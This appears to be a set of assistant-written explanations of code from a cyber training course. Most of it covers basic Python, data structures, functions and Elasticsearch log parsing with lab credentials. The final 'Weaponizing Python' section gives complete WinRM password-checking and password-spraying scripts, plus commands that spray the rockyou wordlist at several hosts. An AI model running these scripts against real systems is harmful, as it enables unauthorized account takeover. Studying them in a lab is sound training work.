### CDAH-M13L1-Python Data Types and Program Flow

Here is a breakdown of all the Python code snippets found in the file [m11-m15_dump .md](https://github.com/lukasaq/hack-class/blob/main/m11-m15_dump%20.md), along with explanations of how each executes:

---

### 1. Print a String
```python
x = "America!"
print(x)
```
**What it does:**  
Assigns `"America!"` to the variable `x` and prints it.  
**Output:**  
America!

---

### 2. String Creation and Print
```python
output = str("Hello")
print(output)
```
**What it does:**  
Creates a string `"Hello"` using the `str()` constructor (unnecessary here, but valid), assigns it to `output`, and prints it.  
**Output:**  
Hello

---

### 3. Integer Creation and Print
```python
output = int(10)
print(output)
```
**What it does:**  
Creates an integer `10`, assigns it to `output`, and prints it.  
**Output:**  
10

---

### 4. Float Creation and Print
```python
output = float(10.1)
print(output)
```
**What it does:**  
Creates a float `10.1`, assigns it to `output`, and prints it.  
**Output:**  
10.1

---

### 5. Complex Number Creation and Print
```python
output = complex(10.j)
print(output)
```
**What it does:**  
Creates a complex number `10j`, assigns it to `output`, and prints it.  
**Output:**  
10j

---

### 6. List Creation and Print
```python
y = list(["apple", "orange", 10])
print(y)
```
**What it does:**  
Creates a list containing two strings and an integer, assigns it to `y`, and prints it.  
**Output:**  
['apple', 'orange', 10]

---

### 7. Tuple Creation and Print
```python
z = tuple(("apple", "orange", 10))
print(z)
```
**What it does:**  
Creates a tuple (immutable list) with two strings and an integer, assigns it to `z`, and prints it.  
**Output:**  
('apple', 'orange', 10)

---

### 8. Range and For Loop
```python
x = range(0,5,1)
for n in x:
    print(n)
```
**What it does:**  
Creates a range object from 0 to 4 (5 is excluded). The for loop iterates through the range and prints each number.  
**Output:**  
0  
1  
2  
3  
4  

---

### 9. Set Creation and Print
```python
x = set(["apple", "orange", 10])
print(x)
```
**What it does:**  
Creates a set (unordered, unique items) with two strings and an integer, assigns it to `x`, and prints it.  
**Output (order may vary):**  
{'apple', 10, 'orange'}

---

### 10. Frozenset Creation and Print
```python
x = frozenset({'apple', 'orange', 10})
print(x)
```
**What it does:**  
Creates an immutable set (frozenset) with the same elements and prints it.  
**Output (order may vary):**  
frozenset({10, 'apple', 'orange'})

---

### 11. Boolean Evaluation and Print
```python
x = 10
y = 11
z = bool(x > y)
print(z)
```
**What it does:**  
Compares x and y, checks if x > y (which is False), converts the result to a Boolean, assigns to `z`, and prints it.  
**Output:**  
False

---

### 12. Bytes Creation and Print
```python
x = bytes(10)
print(x)
```
**What it does:**  
Creates a bytes object of length 10 (all zero bytes), assigns to `x`, and prints it.  
**Output:**  
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

---

### 13. Bytearray Creation and Print
```python
x = bytearray(10)
print(x)
```
**What it does:**  
Creates a mutable bytes array of length 10 (all zero bytes), assigns to `x`, and prints it.  
**Output:**  
bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

---

### 14. Memoryview Creation and Print
```python
x = memoryview(b"10")
print(x)
```
**What it does:**  
Creates a memoryview of the bytes object `b"10"`, assigns to `x`, and prints it.  
**Output:**  
<memory at 0x...> (shows the memory address)

---

### 15. Help Function
```python
help(print)
```
**What it does:**  
Prints the documentation for the built-in `print` function in Python.  
**Output:**  
Help text about `print`.

---

### 16. Input Example
```python
x = input('Enter your name:')
print('Hello, ' + x)
```
**What it does:**  
Prompts the user to enter their name, then prints a greeting using the entered value.  
**Sample Output:**  
Enter your name:  
User1  
Hello, User1

---

### 17. Arithmetic Operations
```python
1 + 1
```
**What it does:**  
Evaluates the expression (in interactive mode or script); outputs `2`.

```python
5 * (10 + 5)
```
**What it does:**  
Evaluates the expression (in interactive mode or script); outputs `75`.

---

### 18. Assign and Print Variable
```python
x = 5 * (10 + 5)
print(x)
```
**What it does:**  
Calculates the value, assigns it to `x`, and prints it.  
**Output:**  
75

---

### 19. String Assignment and Slicing
```python
y = "Hello, World!"
print(y[7:13])
z = (y[7:13])
```
**What it does:**  
- Assigns a string to `y`.
- Prints the substring from index 7 to 12 (Python excludes the end index), which is 'World!'.
- Assigns 'World!' to `z`.  
**Output:**  
World!

---

### 20. Code Block Example (Functions)
```python
def code1(): 
    x = 3 #same block
    y = x + 6 #same block
    print(y) #same block

def code2():
    x = 10 #new block
    y = x + 6 #new block
    print(y) #new block
```
**What it does:**  
Defines two functions.  
- `code1()` assigns 3 to x, 9 to y, and prints 9.  
- `code2()` assigns 10 to x, 16 to y, and prints 16.  
These functions do nothing until called.

---

### 21. Conditional Statement
```python
x = 10
y = 560
if x < y:
    print("x is less than y")
```
**What it does:**  
Checks if x is less than y (True), then prints a message.  
**Output:**  
x is less than y

---

### 22. Conditional with Else
```python
x = 10
y = 560
if x < y:
    print("x is less than y")
else:
    print("x is not less than y")
```
**What it does:**  
Checks if x is less than y (True), prints first message; else, would print the second.  
**Output:**  
x is less than y

---

### 23. For Loop with Variable Range
```python
x = 4
for i in range(0, x):
    print(i)
```
**What it does:**  
Prints numbers 0 through 3.  
**Output:**  
0  
1  
2  
3

---

### 24. While Loop Example
```python
x = 0
while (x < 3):
    print("Loop")
    x += 1
```
**What it does:**  
Prints "Loop" three times, incrementing x each time.  
**Output:**  
Loop  
Loop  
Loop

---

### 25. While Loop up to 5
```python
x = 0
while (x < 5):   
    print("Loop")
    x += 1
```
**What it does:**  
Prints "Loop" five times as x goes from 0 to 4.  
**Output:**  
Loop  
Loop  
Loop  
Loop  
Loop

---

### 26. If Statement with a and b
```python
a = 45
b = 21
if a > b:
    print("a is greater than b")
```
**What it does:**  
Checks if a is greater than b (True), prints the message.  
**Output:**  
a is greater than b

---

### 27. If/Else Boolean Logic Example
```python
if a < b:
    print("a is less than b")
else:
    print("a is not less than b")
```
**What it does:**  
Checks if a is less than b (False), so prints the else clause.  
**Output:**  
a is not less than b

---

### 28. For Loop 1 to x-1
```python
x = 7
for i in range(1, x):
    print(i)
```
**What it does:**  
Prints numbers 1 through 6.  
**Output:**  
1  
2  
3  
4  
5  
6

---

### 29. While Loop with Else
```python
counter = 0
while counter < 3:
    print("inside loop")
    counter += 1
else:
    print("outside loop")
```
**What it does:**  
Prints "inside loop" three times, then prints "outside loop" after the loop ends.  
**Output:**  
inside loop  
inside loop  
inside loop  
outside loop

---

### 30. Nested For Loops for Combinations
```python
users = ['user47', 'user71', 'user82', 'user93']
hosts = ['wks6', 'mailserver', 'kali2', 'centos3', 'ftp', 'www']
for x in users:
    for y in hosts:
        print(x, y)
```
**What it does:**  
Prints every possible combination of a user and a host.  
**Sample Output:**  
user47 wks6  
user47 mailserver  
... (up to 24 combinations)

---

If you want more details on any snippet or how to run them, let me know!

### CDAH-M13L2-Python Data Structures

Here is all the code extracted from the file m11-m15_dump .md, followed by detailed explanations for each code snippet:

---

### 1. Defining and Modifying a List

```python
numbers = [1, 2, 3, 4, 5]
numbers = [1, 2, 4, 5]
```
- Creates a list called numbers with values 1 through 5.
- The second line redefines the numbers list, effectively removing the number 3.

---

### 2. Looping Over a List with a For Loop

```python
numbers = [1, 2, 3, 4, 5]

for number in numbers:
    print(number)

#Output
1
2
3
4
5
```
- Iterates over each element in numbers and prints it to the console.

---

### 3. Looping Over a List with a While Loop

```python
numbers = [1, 2, 3, 4, 5]

# Get length of list using len() function
length = len(list)
i = 0

while i < length:
    print(list[i])
    i += 1

#Output
1
2
3
4
5
```
- Defines a list numbers.
- Gets the length of a list (but mistakenly uses list instead of numbers).
- Uses a while loop to print each item by index.

**Note:** This code has a bug: length = len(list) and print(list[i]) should be length = len(numbers) and print(numbers[i]).

---

### 4. List Comprehension for Iteration

```python
numbers = [1, 2, 3, 4, 5]
[print(number) for number in numbers] 

#Output
1
2
3
4
5
[None, None, None, None, None]
```
- Uses a list comprehension to print each number.
- The list comprehension returns a list of Nones because print() returns None.

---

### 5. Creating and Unpacking Tuples

```python
tuple_1 = ("blue", "green", "yellow", 10)

info = ("Kathy Simpson", "Marketing", "Senior")
(name, department, level) = info

print(name)
print(department)
print(level)

#Output
Kathy Simpson
Marketing
Senior 
```
- tuple_1 is a tuple with mixed data types.
- info is unpacked into three variables: name, department, and level, which are then printed.

---

### 6. Dictionary Creation and Iteration

```python
dictionary = {
    key: value,
    key: value,
    key: value
}

dict = {'name': 'Jeff', 'age': '25', 'address': 'New York'}
items = dict.items()
print(items)
dict_items([('name', 'Jeff'), ('age', '25'), ('address', 'New York')])

#Output
dict_items([('name', 'Jeff'), ('age', '25'), ('address', 'New York')])
```
- Shows dictionary creation (the first block is pseudocode).
- The second block creates a real dictionary and prints its items.

---

### 7. Iterating Over Dictionary Keys and Values

```python
dict = {'name': 'Jeff', 'age': '25', 'address': 'New York'}
items1 = dict.keys()
print(items1)
#Output
dict_keys(['name', 'age', 'address'])

#Using dictionary.values
items2 = dict.values()
print(items2)
#Output
dict_values(['Jeff', '25', 'New York']) 
```
- Extracts and prints only the keys or only the values from a dictionary.

---

### 8. Set Creation

```python
set_a = {"item 1", "item 2", "item 3",}
```
- Creates a set of unique items.

---

### 9. Creating Multidimensional Lists (Arrays)

```python
List = [[1, 2], [3, 4], [5, 6]]
array = [[1, 2, 3, 4], [5, 6, 7, 8]]

#Output
print(array)
[[1, 2, 3, 4], [5, 6, 7, 8]]
print(type(array))
<class 'list'>
```
- List and array are lists of lists (2D arrays).
- Printing array shows its structure; type(array) returns <class 'list'>.

---

### 10. Building Arrays from Rows

```python
row1 = [0, 0, 0, 0, 0]
row2 = [0, 0, 0, 0, 0]
row3 = [0, 0, 0, 0, 0]

array = [row1, row2, row3]

for row in array:
    print (row)
```
- Defines each row as a list, then groups them into a 2D array.
- Loops over each row and prints it.

---

### 11. Creating an Empty Array

```python
array = []
print(array)
```
- Creates and prints an empty list.

---

### 12. Creating Lists and Grouping into an Array

```python
List = [1, 2, 3, 4]
List1 = [5, 6, 7, 8]
List2 = [9, 10, 11, 12]

array = [List, List1, List2]

for list in array:
    print(list)

for list in array:
    print(List2)
```
- Creates three lists and groups them into a list of lists.
- First for-loop prints each list.
- Second for-loop prints List2 for each iteration (so three times).

---

### 13. Creating Rows and a New Array

```python
row1 = [0, 0, 0, 0]
row2 = [0, 0, 0, 0]
row3 = [0, 0, 0, 0]

array1 = [row1, row2, row3]

for row in array1:
    print (row)
```
- Similar to earlier: defines rows, groups into array1, and prints each row.

---

### 14. Creating and Printing an Empty Dictionary

```python
new_dictionary = {}
print(new_dictionary)
print(type(new_dictionary))
```
- Creates an empty dictionary.
- Prints the dictionary and its type.

---

### 15. Creating and Iterating Over a Dictionary

```python
test_results = {"Frank":"Passed", "Corey":"Passed", "Daniel":"Failed"}

for results in test_results.values():
    print(results)
```
- Creates a dictionary of test results.
- Prints only the values ("Passed", "Passed", "Failed").

---

### 16. Adding an Item to a Dictionary and Printing

```python
test_results["Alexandra"] = "Failed" 
print(test_results)
```
- Adds a new key:value pair to the dictionary and prints the updated dictionary.

---

### 17. Creating and Printing Lists

```python
groceries = ["apples", "milk", "chicken", "bread"]
prices = ["2.99", "3.60", "10.99", "3.10"]

print(groceries)
print(prices)
```
- Defines two lists and prints them.

---

### 18. Appending to a List and Iterating

```python
groceries.append("oranges")

for number in groceries:
    print(number)
```
- Adds "oranges" to the groceries list.
- Prints each item in groceries.

---

### 19. Combining Dictionaries and Lists

```python
employees = {}

employees["Name"] = ["Chuck", "Emily", "Max", "Laura"]
employees["Age"] = ["35", "25", "42", "55"]

print(employees)

new_employees = ['Sam', 'Frank', 'Amy']

employees["Name"].append(new_employees)

print(employees)
```
- Creates a dictionary employees with two keys, each holding a list.
- Adds a new list new_employees as a sublist to employees["Name"].
- Prints the dictionary before and after appending.

---

## Execution Explanations

- All code snippets are for basic Python data structures: lists, tuples, dictionaries, and sets.
- The code demonstrates creation, iteration, modification, and nested data structures.
- Most code can be run as-is in a Python interpreter to see the results.
- Errors: The while loop in section 3 has a variable name bug; change list to numbers.
- The multidimensional lists demonstrate how to group lists into a list of lists (like a 2D array).
- The dictionary/list combination in the last section shows that dictionaries can have lists as values, and you can append new lists to those values.

If you need code for a specific section explained in more depth or want to see the output of any snippet, let me know!

### CDAH-M13L3-Python Functions and Classes

Certainly! Below, I’ve extracted all the Python code examples from the provided markdown and explained how each one executes, step by step. Each code block is followed by a clear explanation.

---

### 1. Basic Function Definition and Execution

```python
def print_text():
  print("Hello World!")

print_text()
```
**How it executes:**
- Defines a function called print_text that prints "Hello World!".
- The function is then called with print_text(), so "Hello World!" is displayed when the script runs.

---

### 2. Function with a Parameter

```python
def print_text(msg):
  print(msg)
```
**How it executes:**
- Defines print_text with a parameter msg.
- When called, it will print whatever argument is passed as msg.
- If you call print_text("Hi!"), it will print "Hi!".

---

### 3. Function Call Without Required Argument (Error Example)

```python
def print_text(msg):
  print(msg)

print_text()
```
**How it executes:**
- Attempts to call print_text without the required msg argument.
- Results in a TypeError: print_text() missing 1 required positional argument: 'msg'.

---

### 4. Passing a Variable as an Argument

```python
myMsg = "Hello World!"
print_text(myMsg)
```
**How it executes:**
- Sets myMsg to "Hello World!".
- Calls print_text(myMsg), which prints "Hello World!".

---

### 5. Function with Multiple Parameters

```python
def new_print_text(string1, string2):
  print(string1, string2)

myMsg1 = "Hello "
myMsg2 = "World!"

new_print_text(myMsg1, myMsg2)
```
**How it executes:**
- Defines new_print_text to accept two parameters.
- Sets myMsg1 and myMsg2, then calls the function.
- Prints "Hello  World!" (including the space after Hello).

---

### 6. Keyword Arguments

```python
myMsg1 = "Hello "
myMsg2 = "World!"

new_print_text(string2=myMsg2, string1=myMsg1)
```
**How it executes:**
- Calls new_print_text with arguments explicitly named.
- Order doesn’t matter due to the use of keywords.
- Prints "Hello  World!".

---

### 7. Function with a Default Parameter

```python
def new_print_text(string2, string1="This Is My"):
  print(string1, string2)
```
**How it executes:**
- If string1 isn’t provided when calling, it defaults to "This Is My".
- Calling new_print_text("World!") prints "This Is My World!".

---

### 8. Variable Number of Arguments (*args)

```python
def variable_print_text(*args):
  for i in args:
    print(i)

variable_print_text("Hello","World!","We","are","coding!")
```
**How it executes:**
- *args allows passing any number of arguments.
- Each argument is printed on a new line:
  ```
  Hello
  World!
  We
  are
  coding!
  ```

---

### 9. Returning Values & Reversing Input

```python
def reverse_text(*args):
  reverse = [None] * len(args)
  counter = len(args) - 1
  for i in args:
    reverse[counter] = i
    counter -= 1

  output = ''
  for i in reverse:
    output += ' ' + i

  return output

phrase = reverse_text("Hello","World!","We","are","coding!")
print(phrase)
```
**How it executes:**
- reverse_text reverses the order of the input arguments and concatenates them into a string.
- The result is: " coding! are We World! Hello" (note leading space).
- The string is printed.

---

### 10. Calculator Function & Script Execution

```python
def calc(op, num1, num2):
  if op == '+':
    return num1 + num2
  elif op == '-':
    return num1 - num2
  elif op == '*':
    return num1 * num2
  else:
    return "ERROR: Cannot compute."

def main():
  print("4 + 5 = ", str(calc('+', 4, 5)))
  print("4 - 5 = ", str(calc('-', 4, 5)))
  print("4 * 5 = ", str(calc('*', 4, 5)))
  print("4 / 5 = ", str(calc('/', 4, 5)))

if __name__ == "__main__":
  main()
else:
  print("You called a function from lab1.py")
```
**How it executes:**
- calc performs basic arithmetic based on the op argument.
- main demonstrates usage with sample operations.
- If the script is run directly, the results of each operation are printed.
- If imported, "You called a function from lab1.py" is printed instead.

---

### 11. Importing and Using Functions Across Files

```python
from lab1 import calc

def main():
  # ...other code...
  print("9 * 42 = ", str(calc('*', 9, 42)))
```
**How it executes:**
- Imports the calc function from lab1.py.
- main uses calc to compute 9 * 42 and prints the result.

---

### 12. Python Class Example

```python
class Malware:

  # Constructor
  def __init__(self, name, mtype, tlevel):
    self.name = name
    self.mtype = mtype
    self.tlevel = tlevel

  # Class attributes
  attr1 = "has a malware signature"
  attr2 = "has been analyzed"

  # Class method
  def define(self):
    print(self.name, self.attr1)
    print(self.name, self.attr2)
    print("Refer to documentation for", self.name)

malware1 = Malware("Cryptolocker", "trojan", "high")
malware1.define()
```
**How it executes:**
- Defines a class Malware with attributes and a method.
- Instantiates malware1 with specific values.
- Calls define(), which prints information about malware1.

---

### 13. Editing and Using Class Attributes

```python
aptY.attr3 = "is known to employ"
aptY.malname = "Phishing attacks"
aptY.malAttkID = "T1566"
aptY.define()
print("")
aptX.define()
```
**How it executes:**
- Sets or modifies attributes on aptY object.
- Calls its define() method, prints information (depends on how define() is implemented).
- Prints a blank line.
- Calls define() on another instance, aptX.

---

## Summary Table

| Code Block # | Concept                      | Main Action                                                     |
|--------------|------------------------------|-----------------------------------------------------------------|
| 1            | Basic Function               | Prints "Hello World!"                                           |
| 2            | Function Parameter           | Prints whatever argument is passed                              |
| 3            | Error Example                | Shows error when parameter is missing                           |
| 4            | Argument Passing             | Prints variable value                                           |
| 5            | Multiple Parameters          | Prints two strings                                              |
| 6            | Keyword Arguments            | Arguments assigned by name                                      |
| 7            | Default Parameter            | Uses a default value if not provided                            |
| 8            | *args                        | Prints variable number of arguments                             |
| 9            | Return Value                 | Reverses and concatenates input, prints result                  |
| 10           | Calculator Function          | Performs and prints results of arithmetic operations            |
| 11           | Importing Functions          | Uses functions from another file                                |
| 12           | Class Example                | Defines class, instantiates object, prints info                 |
| 13           | Class Attribute Modification | Modifies and prints updated class attributes                    |

---

If you would like further breakdown or want to see any code block in action, let me know!

----

### CDAH-M13L4-Python for CPT Functionality
Certainly! Below, I’ve broken out and explained each code block found in the m11-m15_dump.md file from the repository lukasaq/hack-class. Each code example is separated, described, and the purpose of each line is explained.

---

## 1. Define and Print a Function in Jupyter

```python
def make_sandwich(meat,cheese,veg1,veg2):
    order = [meat,cheese,veg1,veg2]
    print(order)
make_sandwich("ham","cheddar","lettuce","tomato")
```

**Explanation:**
- `def make_sandwich(meat,cheese,veg1,veg2):`  
  Defines a new function named make_sandwich with four parameters (meat, cheese, veg1, veg2).
- `order = [meat,cheese,veg1,veg2]`  
  Creates a list called order containing the arguments provided.
- `print(order)`  
  Prints the list to the output.
- `make_sandwich("ham","cheddar","lettuce","tomato")`  
  Calls the function with sample arguments, so the output will be:  
  `['ham', 'cheddar', 'lettuce', 'tomato']`

---

## 2. Call the Function Again with Different Arguments

```python
make_sandwich("turkey","swiss","pickle","onion")
```

**Explanation:**
- Calls the make_sandwich function with new ingredients.
- Output will be:  
  `['turkey','swiss','pickle','onion']`

---

## 3. Import a Function from a Module

```python
from Lab1 import make_sandwich
```

**Explanation:**
- Imports only the make_sandwich function from a Python module named Lab1 (Lab1.py must exist in the working directory).

---

## 4. Call the Imported Function

```python
make_sandwich("roast beef","provolone","mushroom","bell pepper")
```

**Explanation:**
- Uses the imported function with new arguments.
- Output will be:  
  `['roast beef','provolone','mushroom','bell pepper']`

---

## 5. Import an Entire Module

```python
import Lab1
```

**Explanation:**
- Imports the entire Lab1 module.  
- To call the function, you would use:  
  `Lab1.make_sandwich(...)`

---

## 6. List Module Attributes

```python
dir(Lab1)
```

**Explanation:**
- Lists all attributes (functions, variables, etc.) in the Lab1 module.

---

## 7. Import a Function from Python Standard Library

```python
from math import sqrt
```

**Explanation:**
- Imports only the sqrt (square root) function from Python’s built-in math module.

---

## 8. Locate a Module File

```python
import inspect
inspect.getfile(Lab1)
```

**Explanation:**
- Uses the inspect module to find the file path of the Lab1 module.

---

## 9. Elasticsearch and Data Analysis Workflow in Jupyter

```python
from elasticsearch import Elasticsearch
from elasticsearch_dsl import Search
```
- Imports the Elasticsearch client and the Search class for building queries.

```python
import pandas as pd
```
- Imports pandas, a data manipulation library, as pd (common alias).

```python
es = Elasticsearch(['https://199.63.64.92:9200'],
ca_certs=False,verify_certs=False, http_auth=('jupyter','CyberTraining1!'))
searchContext = Search(using=es, index='*:so-*', doc_type='doc')
```
- Connects to an Elasticsearch server with the given URL and credentials.
- Creates a Search object to query indices matching '*:so-*' and document type 'doc'.

```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```
- Imports urllib3, a library for HTTP requests.
- Disables warnings about insecure HTTPS requests (since certificates are not validated).

```python
s = searchContext.query('query_string', query='event.module:sysmon AND event.dataset:process_access')
```
- Adds a query to the search context, filtering for documents where event.module is sysmon and event.dataset is process_access.

```python
response = s.execute()
if response.success():
  df = pd.DataFrame((d.to_dict() for d in s.scan()))
df
```
- Executes the search.
- If successful, scans all results and converts them into a pandas DataFrame (df).
- Displays the DataFrame df.

---

## 10. Parsing and Filtering Data

### Extracting FQDNs from an 'observer' column

```python
df['observer'] = df['observer'].astype(str)
df['systems'] = df['observer'].str.rsplit("'",3).str[2].str.strip()
df
```
- Converts the 'observer' column to a string type.
- Splits each string from the right at each single quote (up to 3 splits), takes the third item, and strips whitespace.
- Saves the result in a new column 'systems'.

```python
print(df['systems'])
print(df['systems'].unique())
print(sorted(df['systems'].unique()))
```
- Prints all values from the 'systems' column.
- Prints only unique values.
- Prints unique values, sorted alphabetically.

---

## 11. Using Regular Expressions for Parsing

```python
import re
search_list = ["BP-WKSTN-10.energy.lan","eng-wkstn-3.energy.lan","zeroday.energy.lan"]

for i in df['systems'].unique():
    for j in search_list:
        if re.search(j,i):
            print("Found a match for " + j)
```
- Imports the re module for regular expressions.
- Creates a search list of FQDNs.
- For each unique system, checks if any of the FQDNs in search_list are present (as substrings).
- Prints a message if a match is found.

```python
for i in df['systems'].unique():
    wkstn_hunt = re.search("wkstn", i)
    if wkstn_hunt:
        print("Discovered " + i)
```
- Searches for the substring "wkstn" in each unique system.
- Prints FQDNs that contain "wkstn".

```python
for i in df['systems'].unique():
    wkstn_hunt = re.search("wkstn", i, re.IGNORECASE)
    if wkstn_hunt:
        print("Discovered " + i)
```
- Same as above, but ignores case sensitivity.

---

## 12. Expanding DataFrame Output and Parsing Message Data

```python
pd.options.display.max_rows
pd.set_option('display.max_colwidth', None)

df['message'].head(1)
```
- Checks the current setting for maximum rows to display.
- Sets the option to display the full width of columns (so strings aren't truncated).
- Displays the first row of the 'message' column.

```python
import re
df['message'] = df['message'].astype(str)

for i in df['message'].head(1):
    attkID = re.findall(r'technique\_id\=(.*?)\,', i)
    if attkID:
        attkName = re.findall(r'technique\_name\=(.*?)\n', i)
        print(attkID[0], attkName[0])
```
- Converts the 'message' column to string type.
- For the first message, finds all substrings matching `technique_id=... ,` and `technique_name=... \n` using regular expressions.
- Prints the extracted technique ID and name.

---

## 13. Parsing Multiple Columns in a DataFrame

```python
import re
df['message'] = df['message'].astype(str)
df['observer'] = df['observer'].astype(str)

index = 0
for i in df['message'].head():
    attkID = re.findall(r'technique\_id\=(.*?)\,', i)
    if attkID:
        attkName = re.findall(r'technique\_name\=(.*?)\n', i)
        system = re.findall(r'\'(.+?)\'', df['observer'][index])
        print(attkID[0], attkName[0], "discovered on system", system[1])
    index += 1
```
- Again, ensures both 'message' and 'observer' columns are string type.
- Loops over the first 5 messages. For each:
  - Extracts technique ID and name using regular expressions.
  - Extracts the system name from the observer column.
  - Prints the technique ID, technique name, and which system it was discovered on.

---

If you have any particular code block you want a deeper explanation for (or want the code rewritten, improved, or summarized differently), let me know!


Here's a breakdown of all the code snippets from your markdown file, with each piece separated out and explained in simple terms.

---

### CDAH-M14L1-Weaponizing Python

### 1. check_pwd.py – WinRM Authentication Checker

#### Code

```python
#!/usr/bin/python3
import winrm

testip = '172.16.4.2'
testusername = 'trainee'
testpassword = 'CyberTaining1!'
testdomain = 'energy'

def check_pwd(targetip, targetusername, targetpassword, targetdomain):
    Connection = winrm.Protocol(
        endpoint='http://{}:5985/wsman'.format(targetip),
        transport='ntlm',
        message_encryption='always',
        username=r'{}\{}'.format(targetdomain, targetusername),
        password='{}'.format(targetpassword))
    try:
        shell_id = Connection.open_shell()
        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
        Connection.cleanup_command(shell_id, command_id)
        Connection.close_shell(shell_id)
    except winrm.exceptions.InvalidCredentialsError:
        return False
    return False if std_err else True

passwordvalidity = check_pwd(testip, testusername, testpassword, testdomain)
print("Password {} is {} for user {}".format(testpassword, 'valid' if passwordvalidity else 'invalid', testusername))
```

#### Explanation

- The script uses the PyWinRM library to authenticate to a Windows machine using WinRM (Windows Remote Management).
- Variables like testip, testusername, etc., store the target details.
- The check_pwd function tries to connect using the credentials:
    - If successful, it returns True.
    - If authentication fails (triggers InvalidCredentialsError), it returns False.
    - If some other error, also returns False.
- The bottom lines call the function and print if the password is valid or invalid for the user.

---

### 2. sprayer.py – Password Spraying Script

#### Code

```python
#!/usr/bin/python3
import winrm
import argparse

def check_pwd(targetip, targetusername, targetpassword, targetdomain):
    Connection = winrm.Protocol(
        endpoint='http://{}:5985/wsman'.format(targetip),
        transport='ntlm',
        message_encryption='always',
        username=r'{}\{}'.format(targetdomain, targetusername),
        password='{}'.format(targetpassword))
    try:
        shell_id = Connection.open_shell()
        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
        Connection.cleanup_command(shell_id, command_id)
        Connection.close_shell(shell_id)
    except winrm.exceptions.InvalidCredentialsError:
        return False
    return False if std_err else True

parser = argparse.ArgumentParser()
parser.add_argument('--ip', type=str, nargs='+', required=True)
parser.add_argument('--domain', type=str, required=True)
parser.add_argument('--user', type=str, required=True)
parser.add_argument('--passwordfile', type=str, required=True)
args = parser.parse_args()

for ip in args.ip:
    print("Testing passwords for user {} on machine {} ...".format(args.user, ip))
    finalpassword = 'No entry in password file'
    with open(args.passwordfile, 'r') as passwordfile:
        for password in passwordfile:
            password = password.strip()
            passwordvalidity = check_pwd(ip, args.user, password, args.domain)
            if passwordvalidity:
                finalpassword = password
                break
    print("{} is a valid password for user {} on machine {}".format(finalpassword, args.user, ip))
```

#### Explanation

- This script allows the user to "spray" a list of passwords against one or more IPs for a given user.
- Uses argparse to take command-line arguments for IPs, domain, user, and the password file.
- For each target IP:
    - Reads each password from the file and tries it using check_pwd.
    - If a valid password is found, saves it and stops trying more passwords for that IP.
    - Prints the result for each IP.

---

### 3. sprayer2.py – Alternative Loop Structure for Profiling

#### Code

```python
with open(args.passwordfile, 'r') as passwordfile:
    for password in passwordfile:
        password = password.strip()
        for ip in args.ip:
            finalpassword = 'No entry in password file'
            passwordvalidity = check_pwd(ip, args.user, password, args.domain)
            if passwordvalidity:
                finalpassword = password
                print("{} is a valid password for user {} on machine {}".format(finalpassword, args.user, ip))
        if passwordvalidity:
            break
```

#### Explanation

- This is a restructured version of the password spraying loop, designed for profiling and comparing efficiency.
- Instead of iterating over IPs first, it iterates over passwords first.
- For each password, it tries all IPs.
- If a valid password is found for any IP, it prints the result and breaks out of the password loop.
- The goal is to see which loop order is more efficient for spraying passwords against multiple targets.

---

### 4. Profiling the Scripts

#### Command-line Usage

```sh
python3 -m cProfile ./sprayer.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script1results.txt

python3 -m cProfile ./sprayer2.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script2results.txt
```

#### Explanation

- These commands run both versions of the script using Python's cProfile module.
- The results are redirected to text files (script1results.txt and script2results.txt).
- The profiling helps you compare which loop structure is faster.

---

## Summary Table

| Script/Code      | Purpose                                                  | Key Features                                                             |
|------------------|----------------------------------------------------------|--------------------------------------------------------------------------|
| check_pwd.py     | Test a single credential via WinRM                       | Simple, hard-coded values, prints if password is valid                   |
| sprayer.py       | Spray passwords from a file against multiple IPs         | Argparse for CLI, loops IPs then passwords, stops after first valid pass |
| sprayer2.py      | Alternative spraying algorithm for profiling             | Loops passwords first, then IPs, breaks on first valid password          |
| Profiling usage  | Performance benchmarking of both spraying algorithms     | Uses cProfile to measure script performance                              |

---

If you want a deeper explanation of any specific function, parameter, or concept, let me know!



